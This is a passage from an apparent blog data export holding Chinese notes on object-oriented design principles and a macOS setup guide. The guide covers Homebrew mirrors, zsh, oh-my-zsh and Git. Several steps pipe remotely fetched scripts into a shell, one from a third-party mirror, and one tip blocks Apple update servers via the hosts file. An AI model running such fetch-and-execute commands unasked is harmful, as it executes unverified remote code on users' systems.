咖啡机\n\n- 启发式原则\n\n  > 依赖于抽象，程序中所有依赖关系应终止于抽象类或接口\n  >\n  > - 任何变量都不应该拥有指向具体类的指针或引用\n  >\n  > - 任何类都不应该从具体类派生\n  >\n  > - 任何方法都不应该改写其任何基类中已经实现的方法\n\n- CARP 合成/聚合复用原则\n\n  > 尽量使用合成/聚合，而不是继承\n  >\n  > 在一个新的对象里面使用一些已有的对象，新的对象通过向这些对象的委派达到复用已有功能的目的\n\n- LOD 迪米特法则 / LKD 最少知识原则\n\n  > 不要与陌生人讲话\n  >\n  > 只与你直接的朋友们通信\n  >\n  > 每个软件单位对其他单位都只有最少的知识，而且局限于与本单位密切相关的软件单位\n  >\n  > 狭义迪米特法则：两个不必彼此直接通信的类不应该发生直接的相互作用，此时要调用另一个类的方法时可以通过第三方转发这个调用\n\n# 设计模式\n\n- 核心思维：多态包容\n\n  > 一个宿主对象中包含基类型（或接口）引用，并将一部分行为委托给这个引用所指向的实际对象，使自己的行为可以根据实际对象的不同而有所不同\n  >\n  > 例子：汉堡店问题 ——类爆炸性增长，破坏单点维护能力\n  >\n  > ​ |——使用设计模式解决\n\n# 代码质量\n\n代码审查\n\n代码走查\n\nSonarQube 代码质量管理平台\n\n# 书籍推荐\n\n《重构》——Martin Fowler\n\n《敏捷软件开发》——Robert C Martin\n\n《UML 和模式应用》——拉曼\n\n《设计模式》——Eric Gamma...\n\n《影响力》——罗伯特·西奥迪尼\n\n《金字塔原理》——巴巴拉·明托\n\n《敏捷革命》——杰夫·萨瑟兰\n","slug":"2021/01/代码质量培训","published":1,"updated":"2022-07-23T14:41:42.287Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciu0001zge31ve15cjc","content":"<p>这里记录的是上的培训课的东西</p>\n<span id=\"more\"></span>\n\n<h1 id=\"引导\"><a href=\"#引导\" class=\"headerlink\" title=\"引导\"></a>引导</h1><blockquote>\n<p>面向对象</p>\n<p>封装、继承、多态（最重要）</p>\n</blockquote>\n<p>避免小白兔思维，不是小白兔喜欢胡萝卜就表示鱼也喜欢胡萝卜</p>\n<h1 id=\"软件研发管理精要\"><a href=\"#软件研发管理精要\" class=\"headerlink\" title=\"软件研发管理精要\"></a>软件研发管理精要</h1><blockquote>\n<p>软件工程过程</p>\n<p>​ |— 瀑布模型：预测型，但需求会变化</p>\n<p>​ |— ~ ：适应型</p>\n<p>​ |— SCRUM</p>\n<pre><code>           - 重过程：长期而详细的计划，文档繁多，面向过程而不是面向人，预见而不是适应\n\n           - 轻过程：项目目标明确，有效和高效原则，适应而不是预见\n\n              |— Agile开发 Just Enough\n</code></pre>\n</blockquote>\n<ol>\n<li><p>团队一起做计划-&gt;达成共识-&gt;一致执行</p>\n</li>\n<li><p>杜绝小白兔思维-&gt;确定需求</p>\n</li>\n</ol>\n<blockquote>\n<ol>\n<li><p>乐观</p>\n</li>\n<li><p>DOD-完成的定义</p>\n</li>\n<li><p>以终为始</p>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<p>原型法：业务系统最重要的方法</p>\n<p>axure-交互原型设计软件</p>\n</blockquote>\n<blockquote>\n<p>精益软件原则</p>\n<ul>\n<li><p>避免浪费。过度加工，不合理的等待，第一层次的代码</p>\n</li>\n<li><p>推迟决策。做好需求</p>\n</li>\n<li><p>代码规范。可通过框架实现</p>\n</li>\n</ul>\n</blockquote>\n<h1 id=\"Enterprise-Architect\"><a href=\"#Enterprise-Architect\" class=\"headerlink\" title=\"Enterprise Architect\"></a>Enterprise Architect</h1><table>\n<thead>\n<tr>\n<th align=\"center\">现实世界</th>\n<th align=\"center\">类图</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">一般与特殊</td>\n<td align=\"center\">—▹ 泛化</td>\n<td>is a (kind of) &#x2F; 100%原则，重用（包括关系）</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—▹ 实现</td>\n<td>类实现接口</td>\n</tr>\n<tr>\n<td align=\"center\">整体与部分</td>\n<td align=\"center\">—♦ 组合</td>\n<td>整体管理部分的生命周期</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—◊ 聚合</td>\n<td>整体不一定管理部分的生命周期</td>\n</tr>\n<tr>\n<td align=\"center\">合作</td>\n<td align=\"center\">—&gt;连接</td>\n<td>（组合、聚合、连接）关联：一个对象通过属性来表达对象对另一个对象的静态依赖关系</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—&gt;依赖</td>\n<td>一个对象通过操作（行为）来表达对象对另一个对象的静态依赖关系</td>\n</tr>\n</tbody></table>\n<h1 id=\"面向对象设计原则\"><a href=\"#面向对象设计原则\" class=\"headerlink\" title=\"面向对象设计原则\"></a>面向对象设计原则</h1><ul>\n<li><p>LSP 里氏替换原则</p>\n<blockquote>\n<p>子类不能添加父类没有的约束</p>\n<p>基类要继承接口&#x2F;抽象类，在可能的情况下，由抽象类（接口）继承</p>\n</blockquote>\n</li>\n<li><p>OCP 开放关闭原则</p>\n<blockquote>\n<p>关键在于抽象</p>\n<p>open 拓展，close 修改</p>\n</blockquote>\n</li>\n<li><p>SRP 单一职责原则</p>\n<blockquote>\n<p>类要么是信息类（Entity），要么是服务（Service）</p>\n<p>DDD Domain Driven Design，领域驱动设计</p>\n</blockquote>\n</li>\n<li><p>ISP 接口隔离原则</p>\n<blockquote>\n<ul>\n<li><p>使用委托分离接口，Adapter 模式</p>\n</li>\n<li><p>使用多重继承分离接口</p>\n</li>\n</ul>\n<p>一个类对另一个类的依赖性应当建立在最小接口上，使用多个专门接口比单一肥接口好</p>\n<p>避免接口污染</p>\n</blockquote>\n</li>\n<li><p>DIP 依赖倒置原则</p>\n<blockquote>\n<ul>\n<li>高层模块不应依赖于低层模块，二者都应依赖于抽象</li>\n<li>抽象不应该依赖于细节，细节应该依赖于抽象</li>\n<li>针对接口编程，避免针对实现编程</li>\n</ul>\n<p>经典案例 Mark IV 咖啡机</p>\n</blockquote>\n</li>\n<li><p>启发式原则</p>\n<blockquote>\n<p>依赖于抽象，程序中所有依赖关系应终止于抽象类或接口</p>\n<ul>\n<li><p>任何变量都不应该拥有指向具体类的指针或引用</p>\n</li>\n<li><p>任何类都不应该从具体类派生</p>\n</li>\n<li><p>任何方法都不应该改写其任何基类中已经实现的方法</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li><p>CARP 合成&#x2F;聚合复用原则</p>\n<blockquote>\n<p>尽量使用合成&#x2F;聚合，而不是继承</p>\n<p>在一个新的对象里面使用一些已有的对象，新的对象通过向这些对象的委派达到复用已有功能的目的</p>\n</blockquote>\n</li>\n<li><p>LOD 迪米特法则 &#x2F; LKD 最少知识原则</p>\n<blockquote>\n<p>不要与陌生人讲话</p>\n<p>只与你直接的朋友们通信</p>\n<p>每个软件单位对其他单位都只有最少的知识，而且局限于与本单位密切相关的软件单位</p>\n<p>狭义迪米特法则：两个不必彼此直接通信的类不应该发生直接的相互作用，此时要调用另一个类的方法时可以通过第三方转发这个调用</p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"设计模式\"><a href=\"#设计模式\" class=\"headerlink\" title=\"设计模式\"></a>设计模式</h1><ul>\n<li><p>核心思维：多态包容</p>\n<blockquote>\n<p>一个宿主对象中包含基类型（或接口）引用，并将一部分行为委托给这个引用所指向的实际对象，使自己的行为可以根据实际对象的不同而有所不同</p>\n<p>例子：汉堡店问题 ——类爆炸性增长，破坏单点维护能力</p>\n<p>​ |——使用设计模式解决</p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"代码质量\"><a href=\"#代码质量\" class=\"headerlink\" title=\"代码质量\"></a>代码质量</h1><p>代码审查</p>\n<p>代码走查</p>\n<p>SonarQube 代码质量管理平台</p>\n<h1 id=\"书籍推荐\"><a href=\"#书籍推荐\" class=\"headerlink\" title=\"书籍推荐\"></a>书籍推荐</h1><p>《重构》——Martin Fowler</p>\n<p>《敏捷软件开发》——Robert C Martin</p>\n<p>《UML 和模式应用》——拉曼</p>\n<p>《设计模式》——Eric Gamma…</p>\n<p>《影响力》——罗伯特·西奥迪尼</p>\n<p>《金字塔原理》——巴巴拉·明托</p>\n<p>《敏捷革命》——杰夫·萨瑟兰</p>\n","site":{"data":{}},"excerpt":"<p>这里记录的是上的培训课的东西</p>","more":"<h1 id=\"引导\"><a href=\"#引导\" class=\"headerlink\" title=\"引导\"></a>引导</h1><blockquote>\n<p>面向对象</p>\n<p>封装、继承、多态（最重要）</p>\n</blockquote>\n<p>避免小白兔思维，不是小白兔喜欢胡萝卜就表示鱼也喜欢胡萝卜</p>\n<h1 id=\"软件研发管理精要\"><a href=\"#软件研发管理精要\" class=\"headerlink\" title=\"软件研发管理精要\"></a>软件研发管理精要</h1><blockquote>\n<p>软件工程过程</p>\n<p>​ |— 瀑布模型：预测型，但需求会变化</p>\n<p>​ |— ~ ：适应型</p>\n<p>​ |— SCRUM</p>\n<pre><code>           - 重过程：长期而详细的计划，文档繁多，面向过程而不是面向人，预见而不是适应\n\n           - 轻过程：项目目标明确，有效和高效原则，适应而不是预见\n\n              |— Agile开发 Just Enough\n</code></pre>\n</blockquote>\n<ol>\n<li><p>团队一起做计划-&gt;达成共识-&gt;一致执行</p>\n</li>\n<li><p>杜绝小白兔思维-&gt;确定需求</p>\n</li>\n</ol>\n<blockquote>\n<ol>\n<li><p>乐观</p>\n</li>\n<li><p>DOD-完成的定义</p>\n</li>\n<li><p>以终为始</p>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<p>原型法：业务系统最重要的方法</p>\n<p>axure-交互原型设计软件</p>\n</blockquote>\n<blockquote>\n<p>精益软件原则</p>\n<ul>\n<li><p>避免浪费。过度加工，不合理的等待，第一层次的代码</p>\n</li>\n<li><p>推迟决策。做好需求</p>\n</li>\n<li><p>代码规范。可通过框架实现</p>\n</li>\n</ul>\n</blockquote>\n<h1 id=\"Enterprise-Architect\"><a href=\"#Enterprise-Architect\" class=\"headerlink\" title=\"Enterprise Architect\"></a>Enterprise Architect</h1><table>\n<thead>\n<tr>\n<th align=\"center\">现实世界</th>\n<th align=\"center\">类图</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">一般与特殊</td>\n<td align=\"center\">—▹ 泛化</td>\n<td>is a (kind of) &#x2F; 100%原则，重用（包括关系）</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—▹ 实现</td>\n<td>类实现接口</td>\n</tr>\n<tr>\n<td align=\"center\">整体与部分</td>\n<td align=\"center\">—♦ 组合</td>\n<td>整体管理部分的生命周期</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—◊ 聚合</td>\n<td>整体不一定管理部分的生命周期</td>\n</tr>\n<tr>\n<td align=\"center\">合作</td>\n<td align=\"center\">—&gt;连接</td>\n<td>（组合、聚合、连接）关联：一个对象通过属性来表达对象对另一个对象的静态依赖关系</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">—&gt;依赖</td>\n<td>一个对象通过操作（行为）来表达对象对另一个对象的静态依赖关系</td>\n</tr>\n</tbody></table>\n<h1 id=\"面向对象设计原则\"><a href=\"#面向对象设计原则\" class=\"headerlink\" title=\"面向对象设计原则\"></a>面向对象设计原则</h1><ul>\n<li><p>LSP 里氏替换原则</p>\n<blockquote>\n<p>子类不能添加父类没有的约束</p>\n<p>基类要继承接口&#x2F;抽象类，在可能的情况下，由抽象类（接口）继承</p>\n</blockquote>\n</li>\n<li><p>OCP 开放关闭原则</p>\n<blockquote>\n<p>关键在于抽象</p>\n<p>open 拓展，close 修改</p>\n</blockquote>\n</li>\n<li><p>SRP 单一职责原则</p>\n<blockquote>\n<p>类要么是信息类（Entity），要么是服务（Service）</p>\n<p>DDD Domain Driven Design，领域驱动设计</p>\n</blockquote>\n</li>\n<li><p>ISP 接口隔离原则</p>\n<blockquote>\n<ul>\n<li><p>使用委托分离接口，Adapter 模式</p>\n</li>\n<li><p>使用多重继承分离接口</p>\n</li>\n</ul>\n<p>一个类对另一个类的依赖性应当建立在最小接口上，使用多个专门接口比单一肥接口好</p>\n<p>避免接口污染</p>\n</blockquote>\n</li>\n<li><p>DIP 依赖倒置原则</p>\n<blockquote>\n<ul>\n<li>高层模块不应依赖于低层模块，二者都应依赖于抽象</li>\n<li>抽象不应该依赖于细节，细节应该依赖于抽象</li>\n<li>针对接口编程，避免针对实现编程</li>\n</ul>\n<p>经典案例 Mark IV 咖啡机</p>\n</blockquote>\n</li>\n<li><p>启发式原则</p>\n<blockquote>\n<p>依赖于抽象，程序中所有依赖关系应终止于抽象类或接口</p>\n<ul>\n<li><p>任何变量都不应该拥有指向具体类的指针或引用</p>\n</li>\n<li><p>任何类都不应该从具体类派生</p>\n</li>\n<li><p>任何方法都不应该改写其任何基类中已经实现的方法</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li><p>CARP 合成&#x2F;聚合复用原则</p>\n<blockquote>\n<p>尽量使用合成&#x2F;聚合，而不是继承</p>\n<p>在一个新的对象里面使用一些已有的对象，新的对象通过向这些对象的委派达到复用已有功能的目的</p>\n</blockquote>\n</li>\n<li><p>LOD 迪米特法则 &#x2F; LKD 最少知识原则</p>\n<blockquote>\n<p>不要与陌生人讲话</p>\n<p>只与你直接的朋友们通信</p>\n<p>每个软件单位对其他单位都只有最少的知识，而且局限于与本单位密切相关的软件单位</p>\n<p>狭义迪米特法则：两个不必彼此直接通信的类不应该发生直接的相互作用，此时要调用另一个类的方法时可以通过第三方转发这个调用</p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"设计模式\"><a href=\"#设计模式\" class=\"headerlink\" title=\"设计模式\"></a>设计模式</h1><ul>\n<li><p>核心思维：多态包容</p>\n<blockquote>\n<p>一个宿主对象中包含基类型（或接口）引用，并将一部分行为委托给这个引用所指向的实际对象，使自己的行为可以根据实际对象的不同而有所不同</p>\n<p>例子：汉堡店问题 ——类爆炸性增长，破坏单点维护能力</p>\n<p>​ |——使用设计模式解决</p>\n</blockquote>\n</li>\n</ul>\n<h1 id=\"代码质量\"><a href=\"#代码质量\" class=\"headerlink\" title=\"代码质量\"></a>代码质量</h1><p>代码审查</p>\n<p>代码走查</p>\n<p>SonarQube 代码质量管理平台</p>\n<h1 id=\"书籍推荐\"><a href=\"#书籍推荐\" class=\"headerlink\" title=\"书籍推荐\"></a>书籍推荐</h1><p>《重构》——Martin Fowler</p>\n<p>《敏捷软件开发》——Robert C Martin</p>\n<p>《UML 和模式应用》——拉曼</p>\n<p>《设计模式》——Eric Gamma…</p>\n<p>《影响力》——罗伯特·西奥迪尼</p>\n<p>《金字塔原理》——巴巴拉·明托</p>\n<p>《敏捷革命》——杰夫·萨瑟兰</p>"},{"title":"macOS配置","date":"2021-05-29T13:00:00.000Z","_content":"\n这里记录一下我使用 macOS 时做的一些配置。\n\n<!--more-->\n\n# Homebrew\n\n​ Homebrew 是 mac 的包管理器，仅需执行相应的命令,就能下载安装需要的软件包，可以省掉自己去下载、解压、拖拽(安装)等繁琐的步骤。\n\n> Homebrew 官方文档 https://brew.sh/\n\n## 安装\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n可能会报 `bash curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused` 错误，建议换成 brew 镜像安装脚本。\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)\"\n```\n\n## 配置\n\n​ Homebrew 安装软件时非常慢。为了提升安装速度，需要更改 Homebrew 的安装源，将其替换成国内镜像。\n​ 这里用的是由中科大负责托管维护的 Homebrew 镜像。其中，前两个为必须配置的项目，后两个可按需配置。\n\n- 替换 brew.git ：\n\n  ```bash\n  git -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n  ```\n\n- 替换 homebrew-core.git ：\n\n  ```bash\n  git -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n  ```\n\n- 替换 homebrew-cask.git ：\n\n  ```bash\n  git -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n  ```\n\n- 替换 homebrew-bottles ：\n\n  根据使用的终端修改。\n\n  若是 bash，则执行：\n\n  ```bash\n  echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.bash_profile\n\n  source ~/.bash_profile\n  ```\n\n  若是 zsh，则执行：\n\n  ```bash\n  echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\n\n  source ~/.zshrc\n  ```\n\n  这样 Homebrew 配置就完成了\n\n## 使用\n\n```bash\n// 查询：\nbrew search 软件名\n// 安装：\nbrew install 软件名\n// 卸载：\nbrew uninstall 软件名\n// 更新 Homebrew：\nbrew update\n// 查看 Homebrew 配置信息：\nbrew config\n```\n\n使用官方脚本同样会遇到 uninstall 地址无法访问问题，可以替换为下面脚本：\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall)\"\n```\n\n# 配置使用 zsh 和 oh-my-zsh\n\nMac 终端默认 shell 为 bash，可配置为其他，我更喜欢 zsh 一点。\n\n查看当前使用的 shell\n\n```bash\necho $SHELL\n```\n\n查看安装的 shell\n\n```bash\ncat /etc/shells\n```\n\n## 安装 zsh\n\n执行：\n\n```bash\nbrew install zsh\n```\n\n切换终端为 zsh：\n\n```\nchsh -s /bin/zsh\n```\n\n重启终端即可使用 zsh\n\n## 安装 oh-my-zsh\n\n执行：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n```\n\n打开配置文件，可配置主题等\n\n```bash\nvim ~/.zshrc\n```\n\n更新配置\n\n```bash\nsource ~/.zshrc\n```\n\n查看 zsh 的主题，[oh-my-zsh Themes](https://github.com/ohmyzsh/ohmyzsh/wiki/Themes)\n\n```bash\ncd ~/.oh-my-zsh/themes && ls\n```\n\n查看当前使用主题名称（设置主题为 random 时可查看当前随机到的主题名称）\n\n```bash\necho $ZSH_THEME\n```\n\n查看自带插件\n\n```bash\ncd ~/.oh-my-zsh/plugins && ls\n```\n\n安装高亮语法插件\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n# 在配置文件中添加 `plugins=(zsh-syntax-highlighting)`\n# zsh-syntax-highlighting 官方推荐放在最后面 各插件之间用空格隔开\n```\n\n安装根据历史输入指令的记录即时的提示的插件\n\n```bash\ngit clone git://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n# `plugins=(git zsh-autosuggestions)`\n```\n\n注：报 “Insecure completion-dependent directories detected“ 错误解决办法\n\n这是由于 `/usr/local/share/zsh` `/usr/local/share/zsh/site-functions` 这两个目录没有权限，给这个两个目录赋权就可以了。[issue](https://github.com/robbyrussell/oh-my-zsh/issues/6835)\n\n```bash\nchmod 755 /usr/local/share/zsh\n\nchmod 755 /usr/local/share/zsh/site-functions\n```\n\n# 配置使用 Git\n\n查看用户名和邮箱\n\n```bash\ngit config user.name\n\ngit config user.email\n```\n\n配置用户名和邮箱\n\n```bash\ngit config --global user.name \"username\"\n\ngit config --global user.email \"email\"\n```\n\n查看配置文件的位置，Git 会优先使用库级别的配置，再然后是 global 级别的配置，最后是 system 级别的配置\n\n```bash\n# /etc/gitconfig\n# 系统级别的配置，适用于所有的用户和所有的库，存储在Git安装目录下，可以使用如下开头指令指定和修改\ngit config --system\n```\n\n```bash\n# ~/.gitconfig\n# 用户级别的配置，适用于当前登录的用户，存储在用户目录下，可以使用如下开头指令指定和修改\ngit config --gloabal\n```\n\n```bash\n# .git/config\n# 库级别的配置，适用于某个具体的库，存储在具体的库隐藏的.git文件夹下，可以使用如下开头指令指定和修改\ngit config\n```\n\n# Tips\n\n- 取消更新小红点\n\n  1. 在配置中取消勾选自动检查更新\n\n  2. 终端执行如下两条指令\n\n     ```bash\n     defaults write com.apple.systempreferences AttentionPrefBundleIDs 0\n\n     killall Dock\n     ```\n\n  3. 屏蔽网络访问，编辑 host 文件\n\n     ```bash\n     127.0.0.1 \tswscan.apple.com\n     127.0.0.1 \tswcdn.apple.com\n     127.0.0.1 \tswdist.apple.com\n     ```\n\n- 查看隐藏文件\n\n  1. 快捷键 command+shift+.\n\n  2. 命令行：\n\n  ```bash\n   # 显示文件夹\n   defaults write com.apple.finder AppleShowAllFiles TRUE\n   # 重启finder\n   killall Finder\n\n   # 隐藏文件夹\n   defaults write com.apple.finder AppleShowAllFiles FALSE\n   # 重启finder\n   killall Finder\n  ```\n","source":"_posts/2021/05/macOS配置.md","raw":"---\ntitle: macOS配置\ndate: 2021-05-29 21:00:00\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\n这里记录一下我使用 macOS 时做的一些配置。\n\n<!--more-->\n\n# Homebrew\n\n​ Homebrew 是 mac 的包管理器，仅需执行相应的命令,就能下载安装需要的软件包，可以省掉自己去下载、解压、拖拽(安装)等繁琐的步骤。\n\n> Homebrew 官方文档 https://brew.sh/\n\n## 安装\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"\n```\n\n可能会报 `bash curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused` 错误，建议换成 brew 镜像安装脚本。\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)\"\n```\n\n## 配置\n\n​ Homebrew 安装软件时非常慢。为了提升安装速度，需要更改 Homebrew 的安装源，将其替换成国内镜像。\n​ 这里用的是由中科大负责托管维护的 Homebrew 镜像。其中，前两个为必须配置的项目，后两个可按需配置。\n\n- 替换 brew.git ：\n\n  ```bash\n  git -C \"$(brew --repo)\" remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n  ```\n\n- 替换 homebrew-core.git ：\n\n  ```bash\n  git -C \"$(brew --repo homebrew/core)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n  ```\n\n- 替换 homebrew-cask.git ：\n\n  ```bash\n  git -C \"$(brew --repo homebrew/cask)\" remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git\n  ```\n\n- 替换 homebrew-bottles ：\n\n  根据使用的终端修改。\n\n  若是 bash，则执行：\n\n  ```bash\n  echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.bash_profile\n\n  source ~/.bash_profile\n  ```\n\n  若是 zsh，则执行：\n\n  ```bash\n  echo 'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles' >> ~/.zshrc\n\n  source ~/.zshrc\n  ```\n\n  这样 Homebrew 配置就完成了\n\n## 使用\n\n```bash\n// 查询：\nbrew search 软件名\n// 安装：\nbrew install 软件名\n// 卸载：\nbrew uninstall 软件名\n// 更新 Homebrew：\nbrew update\n// 查看 Homebrew 配置信息：\nbrew config\n```\n\n使用官方脚本同样会遇到 uninstall 地址无法访问问题，可以替换为下面脚本：\n\n```bash\n/bin/bash -c \"$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall)\"\n```\n\n# 配置使用 zsh 和 oh-my-zsh\n\nMac 终端默认 shell 为 bash，可配置为其他，我更喜欢 zsh 一点。\n\n查看当前使用的 shell\n\n```bash\necho $SHELL\n```\n\n查看安装的 shell\n\n```bash\ncat /etc/shells\n```\n\n## 安装 zsh\n\n执行：\n\n```bash\nbrew install zsh\n```\n\n切换终端为 zsh：\n\n```\nchsh -s /bin/zsh\n```\n\n重启终端即可使用 zsh\n\n## 安装 oh-my-zsh\n\n执行：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\"\n```\n\n打开配置文件，可配置主题等\n\n```bash\nvim ~/.zshrc\n```\n\n更新配置\n\n```bash\nsource ~/.zshrc\n```\n\n查看 zsh 的主题，[oh-my-zsh Themes](https://github.com/ohmyzsh/ohmyzsh/wiki/Themes)\n\n```bash\ncd ~/.oh-my-zsh/themes && ls\n```\n\n查看当前使用主题名称（设置主题为 random 时可查看当前随机到的主题名称）\n\n```bash\necho $ZSH_THEME\n```\n\n查看自带插件\n\n```bash\ncd ~/.oh-my-zsh/plugins && ls\n```\n\n安装高亮语法插件\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n# 在配置文件中添加 `plugins=(zsh-syntax-highlighting)`\n# zsh-syntax-highlighting 官方推荐放在最后面 各插件之间用空格隔开\n```\n\n安装根据历史输入指令的记录即时的提示的插件\n\n```bash\ngit clone git://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n# `plugins=(git zsh-autosuggestions)`\n```\n\n注：报 “Insecure completion-dependent directories detected“ 错误解决办法\n\n这是由于 `/usr/local/share/zsh` `/usr/local/share/zsh/site-functions` 这两个目录没有权限，给这个两个目录赋权就可以了。[issue](https://github.com/robbyrussell/oh-my-zsh/issues/6835)\n\n```bash\nchmod 755 /usr/local/share/zsh\n\nchmod 755 /usr/local/share/zsh/site-functions\n```\n\n# 配置使用 Git\n\n查看用户名和邮箱\n\n```bash\ngit config user.name\n\ngit config user.email\n```\n\n配置用户名和邮箱\n\n```bash\ngit config --global user.name \"username\"\n\ngit config --global user.email \"email\"\n```\n\n查看配置文件的位置，Git 会优先使用库级别的配置，再然后是 global 级别的配置，最后是 system 级别的配置\n\n```bash\n# /etc/gitconfig\n# 系统级别的配置，适用于所有的用户和所有的库，存储在Git安装目录下，可以使用如下开头指令指定和修改\ngit config --system\n```\n\n```bash\n# ~/.gitconfig\n# 用户级别的配置，适用于当前登录的用户，存储在用户目录下，可以使用如下开头指令指定和修改\ngit config --gloabal\n```\n\n```bash\n# .git/config\n# 库级别的配置，适用于某个具体的库，存储在具体的库隐藏的.git文件夹下，可以使用如下开头指令指定和修改\ngit config\n```\n\n# Tips\n\n- 取消更新小红点\n\n  1. 在配置中取消勾选自动检查更新\n\n  2. 终端执行如下两条指令\n\n     ```bash\n     defaults write com.apple.systempreferences AttentionPrefBundleIDs 0\n\n     killall Dock\n     ```\n\n  3. 屏蔽网络访问，编辑 host 文件\n\n     ```bash\n     127.0.0.1 \tswscan.apple.com\n     127.0.0.1 \tswcdn.apple.com\n     127.0.0.1 \tswdist.apple.com\n     ```\n\n- 查看隐藏文件\n\n  1. 快捷键 command+shift+.\n\n  2. 命令行：\n\n  ```bash\n   # 显示文件夹\n   defaults write com.apple.finder AppleShowAllFiles TRUE\n   # 重启finder\n   killall Finder\n\n   # 隐藏文件夹\n   defaults write com.apple.finder AppleShowAllFiles FALSE\n   # 重启finder\n   killall Finder\n  ```\n","slug":"2021/05/macOS配置","published":1,"updated":"2022-09-26T15:04:43.016Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciw0003zge38x182nlf","content":"<p>这里记录一下我使用 macOS 时做的一些配置。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Homebrew\"><a href=\"#Homebrew\" class=\"headerlink\" title=\"Homebrew\"></a>Homebrew</h1><p>​ Homebrew 是 mac 的包管理器，仅需执行相应的命令,就能下载安装需要的软件包，可以省掉自己去下载、解压、拖拽(安装)等繁琐的步骤。</p>\n<blockquote>\n<p>Homebrew 官方文档 <a href=\"https://brew.sh/\">https://brew.sh/</a></p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>可能会报 <code>bash curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</code> 错误，建议换成 brew 镜像安装脚本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>​ Homebrew 安装软件时非常慢。为了提升安装速度，需要更改 Homebrew 的安装源，将其替换成国内镜像。<br>​ 这里用的是由中科大负责托管维护的 Homebrew 镜像。其中，前两个为必须配置的项目，后两个可按需配置。</p>\n<ul>\n<li><p>替换 brew.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git -C <span class=\"string\">&quot;<span class=\"subst\">$(brew --repo)</span>&quot;</span> remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>替换 homebrew-core.git ：</p>\n<figure class=\"highlight bash\"><table><tr><td 